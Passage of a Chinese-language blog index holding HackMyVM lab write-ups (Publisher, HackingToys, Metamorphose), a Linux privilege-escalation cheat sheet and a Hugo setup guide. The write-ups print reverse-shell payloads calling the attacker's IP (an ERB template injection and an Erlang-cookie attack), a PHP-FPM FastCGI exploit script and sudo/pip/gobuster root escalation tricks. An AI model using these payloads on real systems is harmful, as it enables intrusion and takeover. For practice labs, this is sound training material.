.data .bss .comment 看看.sh think@publisher:~$ cat /opt/run_container.sh cat: /opt/run_container.sh: Permission denied think@publisher:~$ ls -la /opt/run_container.sh -rwxrwxrwx 1 root root 1715 Mar 29 2024 /opt/run_container.sh think@publisher:~$ ls -la /opt ls: cannot open directory '/opt': Permission denied 哎nmd，运行一下 think@publisher:~$ /opt/run_container.sh permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get \"http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1\": dial unix /var/run/docker.sock: connect: permission denied docker: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post \"http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/create\": dial unix /var/run/docker.sock: connect: permission denied. See 'docker run --help'. List of Docker containers: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get \"http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1\": dial unix /var/run/docker.sock: connect: permission denied Enter the ID of the container or leave blank to create a new one: 啊这，这个玩意是docker的，还要输入一个id，该怎么办呢，不会了，这是easy难度啊我靠 按照作者思路，你先要发现这玩意你连上的不是bash think@publisher:~$ env SHELL=/usr/sbin/ash 所以我们要去生成一个bash shell，比如前面/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash think@publisher:/usr/lib64$ ls -la total 8 drwxr-xr-x 2 root root 4096 Dec 8 2023 . drwxr-xr-x 14 root root 4096 Feb 23 2022 .. lrwxrwxrwx 1 root root 32 Nov 2","date":"2025-03-05","objectID":"/hmv_publisher/:1:4","tags":["渗透"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["靶场"],"content":"为什么OPT不可以访问呢？ 首先我们的shell是ASH 其次是apparmor 限制了，apparmor 可以对程序进行访问控制，靶机里就是限制呢我们的shell ASH ，下面是对ASH限制的配置文件 bash-5.0# cd /etc/apparmor.d/ bash-5.0# ls abi disable local nvidia_modprobe tunables usr.sbin.ash usr.sbin.mysqld usr.sbin.tcpdump abstractions force-complain lsb_release sbin.dhclient usr.bin.man usr.sbin.ippusbxd usr.sbin.rsyslogd bash-5.0# cat usr.sbin.ash #include \u003ctunables/global\u003e /usr/sbin/ash flags=(complain) { #include \u003cabstractions/base\u003e #include \u003cabstractions/bash\u003e #include \u003cabstractions/consoles\u003e #include \u003cabstractions/nameservice\u003e #include \u003cabstractions/user-tmp\u003e # Remove specific file path rules # Deny access to certain directories deny /opt/ r, deny /opt/** rwx, /usr/bin/** mrix, /usr/sbin/** mrix, # Simplified rule for accessing /home directory owner /home/** rwix, } 可以看到是 deny /opt/ r deny /opt/** rwx，限制了我们对OPT文件夹里边的文件的所有权限 因此我们通过动态链接库回到 bash 环境后，改配置文件就对我们不起效了 ","date":"2025-03-05","objectID":"/hmv_publisher/:1:5","tags":["渗透"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["靶场"],"content":"HackingToys ","date":"2025-03-03","objectID":"/hmv_hackingtoys/:1:0","tags":["渗透"],"title":"HMV HackingToys","uri":"/hmv_hackingtoys/"},{"categories":["靶场"],"content":"靶场链接 https://hackmyvm.eu/machines/machine.php?vm=HackingToys ","date":"2025-03-03","objectID":"/hmv_hackingtoys/:1:1","tags":["渗透"],"title":"HMV HackingToys","uri":"/hmv_hackingtoys/"},{"categories":["靶场"],"content":"日常扫描 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.178 08:00:27:23:bb:bb (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.210 f4:6d:3f:27:e6:fb (Unknown) 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.873 seconds (136.68 hosts/sec). 4 responded ┌──(kali㉿kali)-[~] └─$ nmap 192.168.31.178 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 20:19 HKT Nmap scan report for 192.168.31.178 Host is up (0.0013s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 3000/tcp open ppp MAC Address: 08:00:27:23:BB:BB (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds 有ssl证书，https访问3000端口 ","date":"2025-03-03","objectID":"/hmv_hackingtoys/:1:2","tags":["渗透"],"title":"HMV HackingToys","uri":"/hmv_hackingtoys/"},{"categories":["靶场"],"content":"反弹shell 有个输入框，输入1试试 Product does not exist url https://192.168.31.178:3000/search?query=1\u0026message=Product+does+not+exist 像是ssti https://192.168.31.178:3000/search?query=1\u0026message=%3c%25%3d+7*7+%25%3e 回显49 弹shell \u003c%= system(\"nc -e /bin/sh 192.168.31.183 4444\"); %\u003e 成功啦，但是这个用户没有flag，草了 ","date":"2025-03-03","objectID":"/hmv_hackingtoys/:1:3","tags":["渗透"],"title":"HMV HackingToys","uri":"/hmv_hackingtoys/"},{"categories":["靶场"],"content":"提权 lidia@MiWiFi-R4CM-srv:/home$ ss -nltp ss -nltp State Recv-Q Send-Q Local Address:Port Peer Address:PortProcess LISTEN 0 511 127.0.0.1:80 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 1024 0.0.0.0:3000 0.0.0.0:* users:((\"ruby\",pid=427,fd=7)) LISTEN 0 4096 127.0.0.1:9000 0.0.0.0:* LISTEN 0 128 [::]:22 [::]:* 9000和80都不知道在干啥，转发出去，先把socat上传 ┌──(kali㉿kali)-[/usr/bin] └─$ python3 -m http.server 8888 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ... 192.168.31.178 - - [02/Mar/2025 20:49:41] \"GET / HTTP/1.1\" 200 - 192.168.31.178 - - [02/Mar/2025 20:51:31] \"GET /socat HTTP/1.1\" 200 - lidia@MiWiFi-R4CM-srv:/tmp$ wget http://192.168.31.183:8888/socat wget http://192.168.31.183:8888/socat --2025-03-02 13:51:31-- http://192.168.31.183:8888/socat Connecting to 192.168.31.183:8888... connected. HTTP request sent, awaiting response... 200 OK Length: 530680 (518K) [application/octet-stream] Saving to: ‘socat’ socat 100%[===================\u003e] 518.24K --.-KB/s in 0.02s 2025-03-02 13:51:31 (24.0 MB/s) - ‘socat’ saved [530680/530680] lidia@MiWiFi-R4CM-srv:/tmp$ ls ls index.html socat systemd-private-f6d16d6478584049844ac1ca3ccaef9a-apache2.service-Pkk09d systemd-private-f6d16d6478584049844ac1ca3ccaef9a-systemd-logind.service-ILjViD systemd-private-f6d16d6478584049844ac1ca3ccaef9a-systemd-timesyncd.service-NsgWNx lidia@MiWiFi-R4CM-srv:/tmp$ chmod +x socat chmod +x socat (remote) lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:8080,fork TCP4:127.0.0.1:80\u0026 [1] 1314 (remote) lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:9001,fork TCP4:127.0.0.1:9000\u0026 [2] 1318 9000端口这个洞是可以打的，参考https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi 这个端口的信息可以看https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.html #!/bin/bash PAYLOAD=\"\u003c?php echo '\u003c!--'; system('whoami'); echo '--\u003e';\" FILENAMES=\"/var/www/html/index.php\" # Exisiting file path HOST=$1 B64=$(echo \"$PAYLOAD\"|base64) for FN in $FILENAMES; do OUTPUT=$(mktemp) env -i \\ PHP_VALUE=\"allow_url_include=1\"$'\\n'\"allow_url_fopen=1\"$'\\n'\"auto_prepend_file='data://text/plain\\;base64,$B64'\" \\ SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \\ cgi-fcgi -bind -connect $HOST:9001 \u0026\u003e $OUTPUT cat $OUTPUT done 打一下试试 ./exp.sh 192.168.31.178 Content-type: text/html; charset=UTF-8 \u003c!--dodi uid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users) --\u003e .......... 修改一下弹shell就行了 (remote) dodi@hacktoys:/home/dodi$ sudo -l Matching Defaults entries for dodi on hacktoys: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User dodi may run the following commands on hacktoys: (ALL : ALL) NOPASSWD: /usr/local/bin/rvm_rails.sh (remote) dodi@hacktoys:/home/dodi$ cat /usr/local/bin/rvm_rails.sh #!/bin/bash export rvm_prefix=/usr/local export MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-3.1.0 export RUBY_VERSION=ruby-3.1.0 export rvm_version=1.29.12 export rvm_bin_path=/usr/local/rvm/bin export GEM_PATH=/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global export GEM_HOME=/usr/local/rvm/gems/ruby-3.1.0 export PATH=/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin export IRBRC=/usr/local/rvm/rubies/ruby-3.1.0/.irbrc export rvm_path=/usr/local/rvm exec /usr/local/rvm/gems/ruby-3.1.0/bin/rails \"$@\" (remote) dodi@hacktoys:/home/dodi$ ls -la /usr/local/rvm/gems/ruby-3.1.0/bin/rails -rwxrwxr-x 1 root rvm 566 May 20 13:51 /usr/local/rvm/gems/ruby-3.1.0/bin/rails (remote) dodi@hacktoys:/home/dodi$ cat /etc/group | grep rvm rvm:x:1002:lidia,root (remote) lidia@hacktoys:/opt/app/gadgets$ echo '/bin/bash' \u003e /usr/local/rvm/gems/ruby-3.1.0/bin/rails 执行一下，gameover ","date":"2025-03-03","objectID":"/hmv_hackingtoys/:1:4","tags":["渗透"],"title":"HMV HackingToys","uri":"/hmv_hackingtoys/"},{"categories":["靶场"],"content":"Metamorphose ","date":"2025-03-02","objectID":"/hmv_metamorphose/:1:0","tags":["渗透"],"title":"HMV Metamorphose","uri":"/hmv_metamorphose/"},{"categories":["靶场"],"content":"靶场链接 https://hackmyvm.eu/machines/machine.php?vm=Metamorphose ","date":"2025-03-02","objectID":"/hmv_metamorphose/:1:1","tags":["渗透"],"title":"HMV Metamorphose","uri":"/hmv_metamorphose/"},{"categories":["靶场"],"content":"日常扫描 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l -I eth0 [sudo] password for kali: Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.25 08:00:27:78:88:2c (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.210 f4:6d:3f:27:e6:fb (Unknown) 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.936 seconds (132.23 hosts/sec). 4 responded ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sSV -p- -T5 192.168.31.25 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 12:25 HKT Nmap scan report for 192.168.31.25 Host is up (0.0017s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) 4369/tcp open epmd Erlang Port Mapper Daemon 39441/tcp open unknown MAC Address: 08:00:27:78:88:2C (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 139.14 seconds ","date":"2025-03-02","objectID":"/hmv_metamorphose/:1:2","tags":["渗透"],"title":"HMV Metamorphose","uri":"/hmv_metamorphose/"},{"categories":["靶场"],"content":"反弹shell epmd的信息在https://book.hacktricks.wiki/en/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html 有 按着这个方法打一下 ┌──(kali㉿kali)-[~] └─$ echo -n -e \"\\x00\\x01\\x6e\" | nc -vn 192.168.31.25 4369 (UNKNOWN) [192.168.31.25] 4369 (epmd) open name network at port 39441 ┌──(kali㉿kali)-[~] └─$ nmap -sV -Pn -n -T4 -p 4369 --script epmd-info 192.168.31.25 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 12:29 HKT Nmap scan report for 192.168.31.25 Host is up (0.0020s latency). PORT STATE SERVICE VERSION 4369/tcp open epmd Erlang Port Mapper Daemon | epmd-info: | epmd_port: 4369 | nodes: |_ network: 39441 MAC Address: 08:00:27:78:88:2C (Oracle VirtualBox virtual NIC) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.35 seconds github是有个项目的https://github.com/gteissier/erl-matter 直接去找这个漏洞也可以，主要是去爆破cookie 把rockyou字典提取点出来 head -n 1000 /usr/share/wordlists/rockyou.txt \u003e rockyou_top1000.txt 爆破一下 ┌──(kali㉿kali)-[~/Desktop/epmd/erl-matter-master] └─$ for i in $(cat ./rockyou_top1000.txt); do if ! python2 shell-erldp.py 192.168.31.25 39441 \"$i\" whoami 2\u003e\u00261 | grep -q \"wrong cookie, auth unsuccessful\"; then echo \"[+] cookie:$i\"; break; fi; done [+] cookie:batman python2 shell-erldp.py 192.168.31.25 39441 batman 'nc -e /bin/bash 192.168.31.183 4444' [*] authenticated onto victim 反弹shell完成 ","date":"2025-03-02","objectID":"/hmv_metamorphose/:1:3","tags":["渗透"],"title":"HMV Metamorphose","uri":"/hmv_metamorphose/"},{"categories":["靶场"],"content":"提权 linpeas传上去没有什么东西，有的也是权限不够 melbourne@MiWiFi-R4CM-srv:/$ ss -lntp ss -lntp State Recv-Q Send-Q Local Address:Port Peer Address:PortProcess LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 128 0.0.0.0:39441 0.0.0.0:* users:((\"beam.smp\",pid=864,fd=17)) LISTEN 0 128 [::]:22 [::]:* LISTEN 0 50 *:2181 *:* LISTEN 0 50 [::ffff:127.0.0.1]:9092 *:* LISTEN 0 4096 *:4369 *:* LISTEN 0 50 *:37371 *:* LISTEN 0 50 *:37883 *:* 居然还有个9092端口在跑东西，去看看，是kafka在跑，去看看这玩意 melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ ls -la ls -la total 184 drwxrwxr-x 3 root root 4096 Feb 17 2024 . drwxrwxr-x 8 root root 4096 Feb 26 2024 .. -rwxrwxr-x 1 root root 1423 Nov 24 2023 connect-distributed.sh -rwxrwxr-x 1 root root 1396 Nov 24 2023 connect-mirror-maker.sh -rwxrwxr-x 1 root root 963 Nov 24 2023 connect-plugin-path.sh -rwxrwxr-x 1 root root 1420 Nov 24 2023 connect-standalone.sh -rwxrwxr-x 1 root root 861 Nov 24 2023 kafka-acls.sh -rwxrwxr-x 1 root root 873 Nov 24 2023 kafka-broker-api-versions.sh -rwxrwxr-x 1 root root 871 Nov 24 2023 kafka-cluster.sh -rwxrwxr-x 1 root root 864 Nov 24 2023 kafka-configs.sh -rwxrwxr-x 1 root root 945 Nov 24 2023 kafka-console-consumer.sh -rwxrwxr-x 1 root root 944 Nov 24 2023 kafka-console-producer.sh -rwxrwxr-x 1 root root 871 Nov 24 2023 kafka-consumer-groups.sh -rwxrwxr-x 1 root root 959 Nov 24 2023 kafka-consumer-perf-test.sh -rwxrwxr-x 1 root root 882 Nov 24 2023 kafka-delegation-tokens.sh -rwxrwxr-x 1 root root 880 Nov 24 2023 kafka-delete-records.sh -rwxrwxr-x 1 root root 866 Nov 24 2023 kafka-dump-log.sh -rwxrwxr-x 1 root root 877 Nov 24 2023 kafka-e2e-latency.sh -rwxrwxr-x 1 root root 874 Nov 24 2023 kafka-features.sh -rwxrwxr-x 1 root root 865 Nov 24 2023 kafka-get-offsets.sh -rwxrwxr-x 1 root root 867 Nov 24 2023 kafka-jmx.sh -rwxrwxr-x 1 root root 870 Nov 24 2023 kafka-leader-election.sh -rwxrwxr-x 1 root root 874 Nov 24 2023 kafka-log-dirs.sh -rwxrwxr-x 1 root root 881 Nov 24 2023 kafka-metadata-quorum.sh -rwxrwxr-x 1 root root 873 Nov 24 2023 kafka-metadata-shell.sh -rwxrwxr-x 1 root root 862 Nov 24 2023 kafka-mirror-maker.sh -rwxrwxr-x 1 root root 959 Nov 24 2023 kafka-producer-perf-test.sh -rwxrwxr-x 1 root root 874 Nov 24 2023 kafka-reassign-partitions.sh -rwxrwxr-x 1 root root 885 Nov 24 2023 kafka-replica-verification.sh -rwxrwxr-x 1 root root 10884 Nov 24 2023 kafka-run-class.sh -rwxrwxr-x 1 root root 1376 Nov 24 2023 kafka-server-start.sh -rwxrwxr-x 1 root root 1361 Nov 24 2023 kafka-server-stop.sh -rwxrwxr-x 1 root root 860 Nov 24 2023 kafka-storage.sh -rwxrwxr-x 1 root root 956 Nov 24 2023 kafka-streams-application-reset.sh -rwxrwxr-x 1 root root 863 Nov 24 2023 kafka-topics.sh -rwxrwxr-x 1 root root 879 Nov 24 2023 kafka-transactions.sh -rwxrwxr-x 1 root root 958 Nov 24 2023 kafka-verifiable-consumer.sh -rwxrwxr-x 1 root root 958 Nov 24 2023 kafka-verifiable-producer.sh -rwxrwxr-x 1 root root 1714 Nov 24 2023 trogdor.sh drwxrwxr-x 2 root root 4096 Nov 24 2023 windows -rwxrwxr-x 1 root root 867 Nov 24 2023 zookeeper-security-migration.sh -rwxrwxr-x 1 root root 1393 Nov 24 2023 zookeeper-server-start.sh -rwxrwxr-x 1 root root 1366 Nov 24 2023 zookeeper-server-stop.sh -rwxrwxr-x 1 root root 1019 Nov 24 2023 zookeeper-shell.sh 那估计得学一下这玩意了 列出主题列表： melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ ./\\kafka-topics.sh --list --bootstrap-server localhost:9092 \u003c-topics.sh --list --bootstrap-server localhost:9092 __consumer_offsets internal_logs user_feedback users.properties melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ kafak里面的身份主要分生产者和消费者两种，可以简单理解为生产者发送消息，消费者接收消息。下面我们要读取主题里面的信息。 melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ ./kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic users.properties --from-beginning \u003chost:9092 --topic users.properties --from-beginning {\"username\": \"root\", \"password\": \"e2f7a3617512ed81aa68c7be9c435609cfb513b021ce07ee9d2759f08f4d9054\", \"email\": \"root@metamorphose.hmv\", \"r","date":"2025-03-02","objectID":"/hmv_metamorphose/:1:4","tags":["渗透"],"title":"HMV Metamorphose","uri":"/hmv_metamorphose/"},{"categories":["靶场","linux\u0026windows"],"content":"linux提权 ","date":"2025-03-01","objectID":"/linux%E7%AC%94%E8%AE%B0/:1:0","tags":["渗透"],"title":"Linux笔记","uri":"/linux%E7%AC%94%E8%AE%B0/"},{"categories":["靶场","linux\u0026windows"],"content":"信息收集 hostname hostname命令将返回目标计算机的主机名。尽管该值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在企业网络中的角色的信息 uname -a 将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。这在搜索任何可能导致权限升级的潜在内核漏洞(searchsploit)时非常有用。 /proc/version proc 文件系统 (procfs) 提供有关目标系统进程的信息。您会在许多不同的Linux版本中找到 proc，这使其成为您的工具库中必不可少的工具。 查看/proc/version 可能会为您提供有关内核版本的信息以及其他数据，例如是否安装了编译器（例如 GCC）。 /etc/issue 可以通过查看/etc/issue文件来识别系统。该文件通常包含一些有关操作系统的信息，但可以轻松自定义或更改。在这个主题上，任何包含系统信息的文件都可以定制或更改。为了更清楚地了解系统，最好查看所有这些内容。 ps s命令是查看Linux系统上正在运行的进程的有效方法。 在终端上输入ps将显示当前 shell 的进程。 ps -a查看所有正在运行的进程 ps axjf查看进程树 ps aux aux选项将显示所有用户的进程 (a)、显示启动进程的用户 (u) 以及显示未连接到终端的进程 (x)。查看ps aux命令的输出，我们可以更好地了解系统和潜在的漏洞 env env命令将显示环境变量。 PATH 变量可能具有编译器或脚本语言（例如Python），可用于在目标系统上运行代码或用于权限升级。 sudo -l 目标系统可以配置为允许用户以 root 权限运行某些（或全部）命令。 sudo -l命令可用于列出用户可以使用sudo运行的所有命令 id id命令将显示当前用户的身份信息。也可以显示是否磁盘挂载 /etc/passwd /etc/passwd文件包含有关所有用户帐户的信息。但是读的很慢，而且一堆信息可能没用，有用的都在/home下 history 使用history命令查看早期命令可以让我们了解目标系统，并且（尽管很少）存储了密码或用户名等信息。 ifconfig ifconfig命令将显示网络接口的信息。ip a也可以，ip route命令可以查看存在哪些网络路由 find 以下是“查找”命令的一些有用示例。 find . -name flag1.txt: 在当前目录中查找名为 “flag1.txt” 的文件 find /home -name flag1.txt: 在 /home 目录中查找名为 “flag1.txt” 的文件 find / -type d -name config: 在根目录 / 下查找名为 “config” 的目录 find / -type f -perm 0777: 查找具有 777 权限（所有用户均可读、写、执行）的文件 find / -perm a=x: 查找可执行文件 find /home -user frank: 在 /home 目录下查找属于用户 “frank” 的所有文件 find / -mtime 10: 查找过去 10 天内修改过的文件 find / -atime 10: 查找过去 10 天内访问过的文件 find / -cmin -60: 查找在过去一小时（60 分钟）内更改过的文件 find / -amin -60: 查找在过去一小时（60 分钟）内访问过的文件 find / -size 50M: 查找大小为 50 MB 的文件 值得注意的是，“find”命令往往会产生错误，有时会导致输出难以阅读。这就是为什么明智的做法是使用“find”命令和“-type f 2\u003e/dev/null”将错误重定向到“/dev/null”并获得更清晰的输出。 find / -writable -type d 2\u003e/dev/null: 查找全局可写文件夹 find / -perm -222 -type d 2\u003e/dev/null: 查找全局可写文件夹 find / -perm -o w -type d 2\u003e/dev/null: 查找全局可写文件夹 find / -perm -o x -type d 2\u003e/dev/null: 查找全局可执行文件夹 查找开发工具和支持的语言： find / -name perl* find / -name python* find / -name gcc* 查找特定文件权限： find / -perm -u=s -type f 2\u003e/dev/null: 查找带有SUID位的文件，它允许我们以比当前用户更高的权限级别运行该文件。 ","date":"2025-03-01","objectID":"/linux%E7%AC%94%E8%AE%B0/:1:1","tags":["渗透"],"title":"Linux笔记","uri":"/linux%E7%AC%94%E8%AE%B0/"},{"categories":["靶场","linux\u0026windows"],"content":"自动化工具 linPEAS LinEnum LES pspy hack网站 (使用方法自己看一眼就知道了) ","date":"2025-03-01","objectID":"/linux%E7%AC%94%E8%AE%B0/:1:2","tags":["渗透"],"title":"Linux笔记","uri":"/linux%E7%AC%94%E8%AE%B0/"},{"categories":["靶场","linux\u0026windows"],"content":"常见提权方式(只写一些经常遇到的) 内核漏洞 kali有集成工具searchsploit，输入版本号去找就行，然后上传到靶机里面 sudo提权 sudo node -e ‘child_process.spawn(\"/bin/bash\",{stdio: [0,1,2]})’ gobuster提权 perl -e 'print crypt(\"1\",\"aa\")' cat a.py from flask import Flask, Response app = Flask(__name__) @app.route('/', defaults={'path': ''}) @app.route('/\u003cpath:path\u003e') def catch_all(path): if len(path) == 36: return Response(status=404) else: return Response(status=200) if __name__ == '__main__': app.run(host=\"0.0.0.0\", port=80) python a.py * Serving Flask app 'a' * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on all addresses (0.0.0.0) * Running on http://127.0.0.1:80 * Running on http://192.168.64.3:80 Press CTRL+C to quit #靶机 echo 'aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash' \u003e aaa sudo /usr/bin/gobuster -w aaa -u http://192.168.64.3 -n -q -o /etc/passwd cat /etc/passwd su - /aaa 直接写入 有些时候sudo -l你会发现可执行的是个可写入文件，那直接写入/bin/bash去提权即可 又如python可以直接执行时 sudo /usr/bin/python3 -c 'import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")' pip提权 TF=$(mktemp -d) echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh \u003c$(tty) \u003e$(tty) 2\u003e$(tty)')\" \u003e $TF/setup.py pip install $TF 写入密码 当/etc/passwd可以写入的时候，可以把root的密码设置为空，或者是openssl passwd -1去生成密码，把root的密码改了 gcc提权 sudo gcc -wrapper /bin/sh,-s . vi逃逸 前提就是可以root执行vi，直接打开vi写入:!sh，本质是打开了一个shell ","date":"2025-03-01","objectID":"/linux%E7%AC%94%E8%AE%B0/:1:3","tags":["渗透"],"title":"Linux笔记","uri":"/linux%E7%AC%94%E8%AE%B0/"},{"categories":["靶场","linux\u0026windows"],"content":"常用挤巧 文件上传or下载 个人常用sftp 1.SFTP建立连接 sftp username@ip 2.上传 上去之后直接put 3.下载 上去之后直接get，或者是mget * 可以得到当前目录下的全部文件 还有一个方法，本地利用python起一个服务，靶机利用wget下载 python3 -m http.server 80 shell 当你反弹shell准备提权，发现shell不是交互式的 /usr/bin/script -qc /bin/bash /dev/null 直接一步到位 靶机网卡配置 如果扫不到就按照下面操作 在Linux镜像成功安装后启动，连续按e进入编辑模式，修改ro及其后面信息为rw single init=/bin/bash免密进入系统。 Ctrl+X进行保存(Mac为Control+X)进入系统。 进入系统后，ip addr查看当前网卡信息，可以看到这里存在两个网卡，一个是lo回环网卡，另一个则是我们当前虚拟机设定使用的网卡(比如enp0s1) 如果是Ubuntu \u003c 20.04版本，则通过vi /etc/network/interfaces修改该靶场的网卡名enp0s3为上面的enp0s1。如果Ubuntu \u003e= 20.04，则vi nn fxxxx.yaml进行修改。如果是CentOS，则在/etc/sysconfig/network-scripts/ifcfg-xxx中进行类似修改 注：常用于vulnhub靶场 ","date":"2025-03-01","objectID":"/linux%E7%AC%94%E8%AE%B0/:1:4","tags":["渗透"],"title":"Linux笔记","uri":"/linux%E7%AC%94%E8%AE%B0/"},{"categories":["blog"],"content":"hugo搭建 ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:1:0","tags":["hugo"],"title":"Hugo搭建以及主题完善","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["blog"],"content":"mac 安装hugo brew install hugo 创建博客 hugo new site myblog 创建主题 cd site_name git init git submodule add https://github.com/dillonzq/LoveIt.git themes/LoveIt (git clone https://github.com/dillonzq/LoveIt.git themes/LoveIt 也可以) echo theme = “LoveIt” » hugo.toml 当然你也可以选择其他的主题，方法与之类似 修改配置 你知道的，hugo.toml里面就是你整个博客的配置，包括博客名称，作者名字，头像，联系方式等，直接上模板 baseURL = \"https://your-domain.org\" # 更改使用 Hugo 构建网站时使用的默认主题 theme = \"LoveIt\" # 网站标题 title = \"Stilig\" defaultContentLanguage = \"zh-cn\" # 网站语言, 仅在这里 CN 大写 [\"en\", \"zh-CN\", \"fr\", \"pl\", ...] languageCode = \"zh-CN\" # 语言名称 [\"English\", \"简体中文\", \"Français\", \"Polski\", ...] languageName = \"简体中文\" # 是否包括中日韩文字 hasCJKLanguage = true # 默认每页列表显示的文章数目 paginate = 12 # 谷歌分析代号 [UA-XXXXXXXX-X] googleAnalytics = \"\" # 版权描述，仅仅用于 SEO copyright = \"\" # 是否使用 robots.txt enableRobotsTXT = true # 是否使用 git 信息 #enableGitInfo = true # 是否使用 emoji 代码 enableEmoji = true # 忽略一些构建错误 ignoreErrors = [\"error-remote-getjson\", \"error-missing-instagram-accesstoken\"] # 作者配置 [author] name = \"Stilig\" email = \"your_email\" # 菜单配置 [menu] [[menu.main]] weight = 1 identifier = \"posts\" # 你可以在名称 (允许 HTML 格式) 之前添加其他信息, 例如图标 pre = \"\" # 你可以在名称 (允许 HTML 格式) 之后添加其他信息, 例如图标 post = \"\" name = \"文章\" url = \"/posts/\" # 当你将鼠标悬停在此菜单链接上时, 将显示的标题 title = \"\" [[menu.main]] weight = 2 identifier = \"tags\" pre = \"\" post = \"\" name = \"标签\" url = \"/tags/\" title = \"\" [[menu.main]] weight = 3 identifier = \"categories\" pre = \"\" post = \"\" name = \"分类\" url = \"/categories/\" title = \"\" # Hugo 解析文档的配置 [markup] # 语法高亮设置 (https://gohugo.io/content-management/syntax-highlighting) [markup.highlight] # false 是必要的设置 (https://github.com/dillonzq/LoveIt/issues/158) codeFences = true guessSyntax = true lineNos = true lineNumbersInTable = true # false 是必要的设置 # (https://github.com/dillonzq/LoveIt/issues/158) # Goldmark 是 Hugo 0.60 以来的默认 Markdown 解析库 noClasses = false # Goldmark 是 Hugo 0.60 以来的默认 Markdown 解析库 [markup.goldmark] [markup.goldmark.extensions] definitionList = true footnote = true linkify = true strikethrough = true table = true taskList = true typographer = true [markup.goldmark.renderer] # 是否在文档中直接使用 HTML 标签 unsafe = true # 目录设置 [markup.tableOfContents] startLevel = 2 endLevel = 6 [params] # 网站默认主题样式 [\"auto\", \"light\", \"dark\"] defaultTheme = \"light\" # 公共 git 仓库路径，仅在 enableGitInfo 设为 true 时有效 